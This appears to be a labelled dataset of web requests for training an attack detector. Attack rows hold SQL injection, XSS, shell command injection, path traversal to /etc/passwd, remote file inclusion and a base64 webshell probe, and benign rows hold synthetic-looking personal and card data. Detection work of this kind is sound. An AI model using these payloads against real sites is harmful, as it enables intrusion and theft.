request	label
/ anydraw / 	0
"/ string / strings / parameters = |   [  2 -ne  $  ( echo rzsner  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ 111606r1 / 	0
/ string / id = 2 & nombre = queso + manchego & precio = 39 & cantidad = 50 & b1 = aadir + al + carrito 	0
/ javascript / services . zip 	0
/ string / strings / parameters = 1 and elt ( 8853 = 1675 , 1675 )  --  jegm 	1
/ string / strings / parameters = < iframe id = xss  /   / onload = alert (  / xss /  )  >  <  / iframe > 	1
/ 016_susane / 	0
/ string / modo = entrar & login = louladak & pwd = p6r23i . co & remember = on & b1 = entrar 	0
/ string / strings / parameters = 1 '  union all select null , null , null , null , null , null , null -- 	1
/ examples / jsp / colors / htsearch ? exclude =  `  / etc / passwd ` 	1
/ runops / 	0
"/ string / strings / parameters = ""  echo kglfre $  (  ( 0 + 31 )  )  $  ( echo kglfre ) kglfre /  / "	1
"/ string / strings / parameters = ""  echo lgfsnb $  (  ( 46 + 9 )  )  $  ( echo lgfsnb ) lgfsnb | "	1
/ insider-157 / 	0
"/ yver8r9o . jspa ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ msg80969 / 	0
/ 105969 / 	0
"/ string / strings / parameters = <  !  --  # exec cmd =  ""  ""  / usr / bin / id ;  --  > "	1
/ e9rx3ya4 . jspa ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / strings / parameters = ""  | echo $ ifstdgccd $  (  ( 4 + 88 )  )  $  ( echo $ ifstdgccd ) tdgccd \ "	1
/ string / strings / parameters = -9514 )  )  as xdkw where 4975 = 4975 union all select 4975 , 4975 , 4975 , 4975 # 	1
/ javascript / orig . lib 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo xdtltk )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ onlinesem / 	0
/ dl5823 / 	0
/ recumbent-bicycles / 	0
"/ string / strings / parameters = ""  )  )  )  )  )  waitfor delay  ' 0 : 0 : 20 '   /  * "	1
/ string / strings / parameters = calle tortajada s / n ,  6 ? a 	0
/ string / strings / parameters = 1 )  where 8474 = 8474 or 5356 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  -- 	1
/ scripts / commerce . cgi ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00index . html 	1
/ administrator / components / com_chronocontact / excelwriter / writer / worksheet . php ? mosconfig_absolute_path = xxpathxx ? 	1
/ tukodz3j . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = '   str =  $  ( echo jkjfeg )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
/ save . php ? file_save =  @ rfiurl 	0
/ string / strings / parameters = < script > var x  =  safe123 . onclick ; safe123 . onclick  =  function ( event )   { var f  =  false ; var o  =   {  istrusted :  true  }  ; var a  =   [ event ,  o ,  event ]  ; var get ; event . __definegetter__ (  ' type '  ,  function (  )   { get  =  arguments . callee . caller . arguments . callee ; return  ' click '  ;  }  )  ; var _alert  =  alert ; alert  =  function (  )   {  alert  =  _alert  }  ; x . apply ( null ,  a )  ;  ( function (  )   { arguments . __definegetter__ (  ' 0 '  ,  function (  )   {  return a . pop (  )  ;   }  )  ; alert ( get (  )  )  ;  }  )  (  )  ;  }  ; safe123 . click (  )  ;  <  / script >  # 	1
/ 12link / 	0
/ string / strings / parameters = d_eslechar 	0
/ javascript / settings . csv 	0
"/ string / strings / parameters = < style >  . crosssitescripting { background-image : url (  ""  "" javascript : alert (  ' crosssitescripting '  )  ""  ""  )  ;  }  <  / style >  < a class = crosssitescripting >  <  / a > "	1
/ r3le3om5 . do ?  < script > cross_site_scripting . nasl <  / script > 	1
/ img102381332072911 / 	0
/ opflash / 	0
/ daancalendar_1 / 	0
/ string / strings / parameters = 28820 	0
/ string / strings / parameters = francois 	0
/ string / strings / parameters = daughtre3 	0
/ javascript / skins . pl 	0
/ servlet / webacc ? user . html =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini \ x00 	1
/ string / strings / parameters = 1 %  '  and 2388 = benchmark ( 5000000 , md5 ( 0x6d457153 )  )  # 	1
"/ string / strings / parameters = < iframe src =  "" http :  /  / example . com /  ""  style =  "" width : 800px ;  height : 350px ;  border : none ;  mask :  url (  # maskforclickjacking )  ;  ""  /  > "	1
/ phpmyadmin / index . php ? cat_select =  < script > foo <  / script > 	1
"/ eei78ore . dll ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 042748 / 	0
"/ string / strings / parameters = ""  ""  >  < iframe src =  '  '  onload = alert (  ' mphone '  )  > "	1
"/ catalog_products_with_images . php /  ""  >  < script > alert ( 414615599126 )  <  / script >  <  "" "	1
/ string / strings / parameters = lindolfo 	0
/ email_subscribe . php ? root_prefix = xxpathxx ? 	1
/ javascript / sslvpn . xls 	0
"/ top . php ? stuff =  "" ping \ x0b-w \ x0b10000 \ x0b-n \ x0b1 \ x0b1 . 2 . 3 . 4 & rem \ x0b "	1
/ 4a9663d49e09c71b3d9e77d057050e62 / 	0
/ opensiteadmin / scripts / classes / form . php ? path = http :  /  / 192 . 168 . 202 . 96 : 8080 / whmch8ftkt7kv ?  \ x00 	1
/ 7dbjwpw6 . jsp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ trojsdbotcy / 	0
/ en-us / account / sendcard . php ? view = 1 & id =  ' sendcard_sql . nasl 	1
/ string / modo = registro & login = rhetta & password = 4354c07a & nombre = cenobia & apellidos = pertusa + boladera & email = ripley_kapianidze @ reidesa . net & dni = 15821726a & direccion = c /  + granada + 40 ,  + 1 ? g & ciudad = millares & cp = 34829 & provincia = valencia & ntc = 4815643958728547 & b1 = registrar 	0
/ string / strings / parameters = mellor 	0
/ iraniassad1 / 	0
/ givexpabilitytosearchactivedirectory / 	0
/ manual / fr / platform / ebcdic . html 	0
/ 148083 / 	0
/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /  .  .  /  .  .  /  { file } 	1
/ demolition racer / 	0
/ string / strings / parameters = '  & echo $ ifszfqgsy $  (  ( 67 + 86 )  )  $  ( echo $ ifszfqgsy ) zfqgsy 	1
/ daqing / 	0
/ phpmyadmin / www / delivery / ac . php ? bannerid = -1331904367 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_oyo3tg_8 ]  )  )  ; die ;  /  * 	1
/ beauty and the beast / 	0
/ cgi / testcgi . exe 	1
/ sfooter / 	0
/ string / strings / parameters = ; echo $ ifsvqmzed $  (  ( 6 + 60 )  )  $  ( echo $ ifsvqmzed ) vqmzed | 	1
"/ ybz5rz7a . do ?  < meta http-equiv = set-cookie content =  "" testsbvw = 6289 ""  > "	1
/ string / modo = registro & login = schafer & password = 7li7e37r06 & nombre = santos & apellidos = ricciardiello + ameller & email = kelz @ animationproject . be & dni = 08841812z & direccion = passeig + oreneta + 23 + 8 ? g & ciudad = huarte / uharte & cp = 37488 & provincia = cceres & ntc = 7240523818698482 & b1a = registrar 	1
"/ m4kkjf8l . idc ?  < meta http-equiv = set-cookie content =  "" testyglc = 8988 ""  > "	1
/ string / strings / parameters = '  |   [  6 -ne  $  ( echo uumiwo  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & 	1
/ leadership_election / 	0
/ leskointro / 	0
/ string / strings / parameters = raudres 	0
/ scripts / index . php ? id = egyb16sayu ' 	1
/ string / strings / parameters = 1 '  and 4386 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  ' fdbm '  like  ' fdbm 	1
/ string / modo = registro & login = daochuan & password = vir7eino & nombre = violeta & apellidos = caadillas + almendro & email = papadouka_cuttinet @ professionalhosting . com . il & dni = 84411118z & direccion = calle + dinamarca + 14 ,  +  & ciudad = navas + de + bureba & cp = 15175 & provincia = teruel & ntc = 6285982305475025 & b1 = registrar 	0
/ q89851882 	0
/ string / strings / parameters = < script > confirm ( document . getelementsbytagname (  ' html '  )  [ 0 ]  . innerhtml . match (  /  '  (  [  ^  '  ]  +  )  /  )  [ 1 ]  )  <  / script > 	1
/ string / strings / parameters = exec sp 	1
/ string / strings / parameters = 1 '  )  )  as fusi where 2788 = 2788 or 8514 = benchmark ( 5000000 , md5 ( 0x544d5a4c )  )  # 	1
/ javascript / nethome . core 	0
/ string / modo = insertar & precio = 2408 & b1 = pasar + por + caja / 	1
/ string / strings / parameters = abades 	0
/ sl-1800 / 	0
/ examples / servlets / servlet / kb . cgi ? view =  '  & lang = en 	1
/ bittorrent_472753 / 	0
/ javascript / page1 . ini 	0
/ pbriefs / 	0
/ string / strings / parameters = < script src =  /  / ha . ckers . org /  . j > 	1
/ string / strings / parameters = zamora 	0
/ niet2053230067 . php3 	0
/ examples / jsp / jsp2 / jspx / webdist . cgi ? distloc =  ; id 	1
/ javascript / todo . phtml 	0
/ examples / jsp / cal / file . cgi ? name =  / eventcache /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini 	1
/ plhm_recby / 	0
/ mostlyce / jscripts / tiny_mce / plugins / htmltemplate / htmltemplate . php ? mosconfig_absolute_path = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ? 	1
/ examples / jsp / colors / lib / dbman_filter . inc . php ? lib_path =  / etc / passwd \ x00 	1
/ index_general / 	0
/ string / strings / parameters = 78655971l 	0
/ string / modo = registro & login = strucche & password = corcheta & nombre = cstulo & apellidos = pelayo + petit & email = baio @ misanimalesdomesticos . coop & dni = 93042317a & direccion = veracruz ,  + s / n + 2 ? f & ciudad = manzaneda & cp = 40130 & provincia = l /  + lei ? da & ntc = 6073015432494873 & b1 = registrar 	1
/ string / modo = registro & login = zubans & password = 0e06u8s17 & nombre = amine & apellidos = pijahumeda & email = valcour @ piensoparaperros . dj & dni = 10898485g & direccion = c /  + domingo + bello + espinosa + 138 +  & ciudad = samper + de + calanda & cp = 45440 & provincia = cceres & ntc = 8159487475137064 & b1 = registrar 	0
/ string / strings / parameters = echo ncmpjp $  (  ( 69 + 98 )  )  $  ( echo ncmpjp ) ncmpjp \ 	1
/ cgis / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ 04_mcp / 	0
/ dendrofit / 	0
/ string / strings / parameters = 32893899n 	0
/ string / modo = registro & login = earvin & password = talonera & nombre = shazmnn & apellidos = galindo + beneyto & email = gaal-grillo @ ofertasrusas . com & dni = 13258011y & direccion = calle + sant + pau ,  + 117 ,  +  & ciudad = villamesas & cp = 29427 & provincia = palencia & ntc = 8511359548446745 & b1 = registrar 	0
/ javascript / old . trace 	0
/ 000026335 / 	0
/ 25-evans / 	0
/ cgi-914 / fileseek2 . cgi ? foot =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd & head = 	1
/ 1165862193 / 	0
"/ p043snfr . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / denied . yml 	0
/ nationalslowdown / 	0
/ javascript / alert . rss 	0
/ string / strings / parameters = -7797 '  +  ( select oulr where 7091 = 7091 union all select 7091 , 7091 , 7091 , 7091 , 7091 , 7091 , 7091 , 7091 , 7091 # 	1
/ string / strings / parameters = 26526 	0
/ v15002603 / 	0
"/ string / strings / parameters = -1513 ""  ""  )  as swvd where 2958 = 2958 union all select 2958 , 2958 , 2958 -- "	1
/ top . php ? stuff =  '  \ x0auname \ x09 > q23871271 \ x09 # 	1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo jicoqs )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1 	1
"/ top . php ? stuff =  ""  & ping \ xa0-w \ xa010000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 & rem \ xa0 "	1
/ string / modo = registro & login = katja & password = habilitador & nombre = bastian & apellidos = urigoiti + unzaga & email = navartil @ soyandaluz . va & dni = 78433382r & direccion = passatge + cala + ratjada + 127 ,  +  & ciudad = hontoria + del + pinar & cp = 50142 & provincia =  /  ? seg + ovia & ntc = 6142248987618034 & b1 = registrar 	1
/ javascript / type . 7z 	0
/ string / strings / parameters = 0851327510236186 	0
"/ main . php ? logout =  "" ping ; -w ; 9000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ; "	1
"/ string / strings / parameters = ""   str =  $  ( echo wxkpiw )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | "	1
/ javascript / http . exe 	1
/ javascript / dyn . lst 	0
/ 110071 / 	0
"/ string / strings / parameters = < div id =  "" 64 ""  >  <  ! doctype x [  <  ! entity x system  "" http :  /  / html5sec . org / test . xxe ""  >  ]  >  < y >  & x ;  <  / y >  /  /  [  ""  '  `  --  >  ]  ]  >  ]  <  / div >  < div id =  "" 65 ""  >  < svg onload =  "" javascript : alert ( 65 )  ""  xmlns =  "" http :  /  / www . w3 . org / 2000 / svg ""  >  <  / svg >  /  /  [  ""  '  `  --  >  ]  ]  >  ]  <  / div > "	1
/ sexiga-downloads / 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo dkkeqz )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  & 	1
/ pcmcia_ci10378 / 	0
/ hindunet_images / 	0
/ 286944 / 	0
/ help . php ? q = ver \ x09 > q23929766 & rem \ x09 	1
/ ok_hall / 	0
/ webhopper1_small / 	0
/ 183203 / 	0
/ vpresidence / 	0
/ bttomright / 	0
/ string / strings / parameters = 1 %  '  or  ( select 9173 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9173 = 9173 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  and  '  %  '  =  ' 	1
/ en-us / account / index . php ? cid =  ' 	1
/ 28kristof / 	0
/ string / strings / parameters = swinton @ voragolive . kz 	0
/ partnernetwork / 	0
/ string / strings / parameters = compurgar 	0
/ string / strings / parameters = 9209 	0
/ string / strings / parameters = cruzado garmes 	0
/ javascript / high . pl 	0
"/ 0rufe52p . cfm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 175999 / 	0
/ help . php ? q =  '  ; del \ x09q85144243 \ x09 # 	1
/ preview_2006-07 / 	0
/ 194841_1 / 	0
/ string / modo = insertar & precio = 2595 & b1 = pasar + por + caja 	0
/ string / strings / parameters = leandro 	0
/ cacti / shared / help . php ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = tomacic 	0
/ injectorwithchipsmall / 	0
/ string / strings / parameters = 18327 	0
/ help_screen18 / 	0
/ javascript / phpmyadmin . phtml 	0
/ string / strings / parameters = 09226 	0
/ string / strings / parameters = '   str =  $  ( echo ifiptc )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ 042554 / 	0
/ 60 second wipe out / 	0
/ string / strings / parameters = ryan 	0
/ string / modo = insertar & precio = 6867 & b1 = confirmar / 	1
"/ main . php ? stuff =  ""  | ping \ xa0-w \ xa09000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 | rem \ xa0 "	1
/ dairyfield / 	0
/ examples / jsp / error / shopaddtocart . asp ? productid =  ' 42 	1
/ javascript / pkg . tgz 	0
"/ d5a5renl . nsf ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 1 '  )  )  )  ; select count (  *  )  from generate_series ( 1 , 5000000 )  and  (  (  (  ' ldqq '  =  ' ldqq 	1
/ string / strings / parameters = sureda fuertes 	0
/ ac2-buyersguidered / 	0
/ string / strings / parameters = |   [  5 -ne  $  ( echo vazljc  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ string / strings / parameters = 40184 	0
/ string / strings / parameters = barsky 	0
/ 4013185 / 	0
/ 000094524 / 	0
"/ string / strings / parameters = < script > document . cookie =  "" testxagh = 6987 ;  ""  <  / script > "	1
/ cgi-bin / wikka . php ? wakka = homepage /  .  .  /  .  .  / actions / wikkachanges 	1
/ string / strings / parameters = $ despumar 	0
/ shabbychicbarstools / 	0
/ annual_reports / 	0
/ en-us / account / download . php ? language =  / etc / passwd \ x00 	1
/ duelfer / 	0
/ eg2u8pbv . fts ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = noya driu 	0
/ javascript / favorite . tpl 	0
/ cgi-bin / shared / help . php ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ examples / jsp / checkbox / top . php ? header =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = tracz 	0
/ string / strings / parameters = '  echo nzxqys $  (  ( 60 + 28 )  )  $  ( echo nzxqys ) nzxqys /  / 	1
/ string / strings / parameters = steinbach @ ballobar . com . tf 	0
/ string / strings / parameters = soule terraza 	0
/ javascript / system . c 	0
"/ string / strings / parameters = 1 ""  ""  and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  ""  "" zwov ""  ""  =  ""  "" zwov "	1
/ string / strings / parameters = 1 )  as hlcn where 1165 = 1165 rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) vwyq )  # 	1
/ fakultetai / 	0
"/ string / strings / parameters = -7635 ""  ""  union all select 1284 , 1284 , 1284 , 1284 , 1284 , 1284 # "	1
/ pannenservice / 	0
/ string / strings / parameters = 1350447535832439 	0
/ string / modo = registro & login = huntlee & passworda = da . mera & nombre = abundio & apellidos = vendrells + unda & email = goetz-pongnati @ itrends . tt & dni = 80216747s & direccion = calle + francisco + de + diego ,  + 83 + 1-h & ciudad = moeche & cp = 04897 & provincia = valladolid & ntc = 6300701624208946 & b1 = registrar 	1
/ javascript / domain . pm 	0
/ alberto-ballestin / 	0
/ string / modo = insertar & precio = 3471 & b1 = confirmar / 	1
/ 214471 / 	0
/ string / strings / parameters = cunillera penades 	0
/ ohio_warren / 	0
/ wp_intro / 	0
/ string / strings / parameters = 1 + union + select + 1 , 2 , 3 # 	1
/ javascript / jacob . cpp 	0
/ shoretel / 	0
/ travelprivileges / 	0
/ string / strings / parameters = '  | echo hkfpkh $  (  ( 65 + 16 )  )  $  ( echo hkfpkh ) hkfpkh | 	1
/ 145312001 / 	0
/ 0131347942 / 	0
/ string / id = 3 & nombre = jamn + ibrico & precio = 85 & cantidad = 25 & b1 = aadir + al + carrito 	0
/ bnjrhomepageweek6 / 	0
/ en-us / account / admin / admin . php ? sid =  ' 	1
/ v_129466 / 	0
/ q52853568 	0
/ string / modo = registro & login = daryle & password = tet / r3mero & nombre = licina & apellidos = acexas + camarillo & email = vadis @ clubdegolf . com . gf & dni = 13138842t & direccion = c /  + alberto + casaal + shakery + 60 ,  + 4-h & ciudad = santiurde + de + reinosa & cp = 09471 & provincia = vila & ntc = 3535089372971785 & b1 = registrar 	1
/ en-us / account / mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1331905235 , 4 --  & blog = 1 	1
/ string / strings / parameters = plza .  leire ,  1 ,  6 ? a 	0
/ javascript / showjobs . ppt 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' zeet '  from dual where 9567 = 9567 and 8594 =  ( select 8594 from pg_sleep ( 5 )  )  -- 	1
/ string / strings / parameters = 78912457d 	0
/ 060russack / 	0
/ strategicpartners / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo hmzjiq )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
/ rolik_dnja / 	0
/ javascript /  ~ john . tar . bz2 	0
/ string / strings / parameters = ping . kasatsu @ asdn . cl 	0
"/ en-us / fo564rei . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 2304 	0
/ string / strings / parameters = njar 	0
/ 267600 / 	0
/ javascript / peek . db 	0
"/ string / strings / parameters = 1 ""  ""  )  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  (  ""  "" ngnd ""  ""  like  ""  "" ngnd "	1
/ string / strings / parameters = daniza 	0
/ javascript / week . xls 	0
/ mcfarlanebasketballfigures / 	0
/ string / strings / parameters = faada 	0
/ string / strings / parameters = id    id     # required >  ]  > 	1
/ 86ae9a486cf3 / 	0
/ string / strings / parameters = 1 '  )  )  )  or 7552 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  and  (  (  (  ' nqam '  =  ' nqam 	1
"/ jw64yq8u . cfc ?  < meta http-equiv = set-cookie content =  "" testylfu = 1313 ""  > "	1
/ but-fbi1 / 	0
"/ help . php ? q =  ""  | ping \ x09-w \ x0910000 \ x09-n \ x091 \ x091 . 2 . 3 . 4 | rem \ x09 "	1
/ string / strings / parameters = 8703 	0
/ string / strings / parameters = < body onload = popup = 1 ;  > 	1
"/ string / strings / parameters = 1 ""  ""  and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  ""  "" wtkx ""  ""  =  ""  "" wtkx "	1
/ categorie / 	0
/ javascript / priv . vbs 	0
/ darkeye / 	0
/ 040153 / 	0
/ 93217847 / 	0
/ current_volcs / 	0
"/ examples / jsp / num / index . php ? name = your account & profile = anyone ""  >  < script > alert (  ' nessus was here '  )  ;  <  / script > "	1
/ string / strings / parameters = 1 '  and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  and  ' pnpx '  =  ' pnpx 	1
/ 1400_1490 / 	0
/ string / strings / parameters = alano 	0
/ string / modo = registro & login = boschin & password = 3189p6zada & nombre = amadis & apellidos = funes + ports & email = gracie @ triplectextil . me & dni = 81791661g & direccion = plza .  + beato + andres + hiberno + n ,  + 63 + 9a & ciudad = pedrosillo + de + los + aires & cp = 03345 & provincia = guadalajara & ntc = 1272948221132397 & b1 = registrar 	1
/ string / strings / parameters = pandora 	0
/ index . php ? req =  < script > alert (  ' wvs-xss-magic-string-411545577486 '  )  <  / script > submit = submit 	1
"/ o35zot2r . jspa ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ frm000299-mw02 / 	0
/ 168595 / 	0
"/ string / strings / parameters = |   [  6 -ne  $  ( echo vnalzq  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ javascript / projects . vb 	0
/ string / strings / parameters = lautaro 	0
/ 000032268 / 	0
/ gaming_laptops / 	0
/ string / strings / parameters = cibeles 	0
/ string / strings / parameters = -8436 '  )  as frmf where 7225 = 7225 or make_set ( 9354 = 9354 , 7185 )  -- 	1
/ string / strings / parameters = 1 '  )  or 8384 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  ' xdce '  =  ' xdce 	1
"/ en-us / jnv890lt . aspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = danciel 	0
/ string / strings / parameters = tauber5 @ lamolahotel . bb 	0
/ sebnem-scheffer / 	0
/ javascript / access_log . 1 . exe 	1
/ macedonia_partners / 	0
/ article1566707 / 	0
/ prodpagewzcou / 	0
"/ string / strings / parameters = 1 ""  ""  )  where 4660 = 4660 or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  -- "	1
/ string / strings / parameters = -4057 '  )  order by 1 # 	1
/ string / strings / parameters = 1275136116918867 	0
/ examples / jsp / cal / language . php ? data_dir =  / etc / passwd \ x00 	1
/ string / strings / parameters = 1 )  )  as nlzg where 1482 = 1482 procedure analyse ( extractvalue ( 5840 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end )  )  , 0x717a767a71 )  )  , 1 )  -- 	1
/ cgi-local / ppdscgi . exe 	1
/  < script > foo <  / script > 	1
/ 130342 / 	0
/ cote '  content / 	1
/ 216ah20010723mr / 	0
"/ qczkquis . cfc ?  < meta http-equiv = set-cookie content =  "" testkwlg = 5591 ""  > "	1
/ summaries97 / 	0
"/ main . php ? logout =  ""  & uname \ x09 # "	1
/ string / strings / parameters = 1 or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  #  vojr 	1
/ main . php ? logout =  & del ; q28829334 & rem ; 	1
/ string / strings / parameters = throne @ familiamarino . cl 	0
/ string / strings / parameters = '  ; echo vujcmw $  (  ( 70 + 75 )  )  $  ( echo vujcmw ) vujcmw 	1
"/ string / strings / parameters = -6095 ""  ""  )  )  as kgfp where 3601 = 3601 or 7287 = 9373 # "	1
"/ string / strings / parameters = ""  | echo $ ifseicszj $  (  ( 51 + 32 )  )  $  ( echo $ ifseicszj ) eicszj | "	1
/ string / strings / parameters = patchit 	0
/ scripts / modules / tinymce / content_css . php ? templateid = -1 /  *  *  / union /  *  *  / select /  *  *  / 1331919223 , 1 , 1246967071 -- 	1
"/ en-us / ddoworrl . idc ?  < script > document . cookie =  "" testvlau = 8517 ;  ""  <  / script > "	1
/ string / strings / parameters = ollo 	0
/ jm0511md / 	0
/ mzcxntk2 / 	0
/ ereg_security / 	0
"/ main . php ? stuff =  "" ping \ x09-w \ x098000 \ x09-n \ x091 \ x091 . 2 . 3 . 4 & rem \ x09 "	1
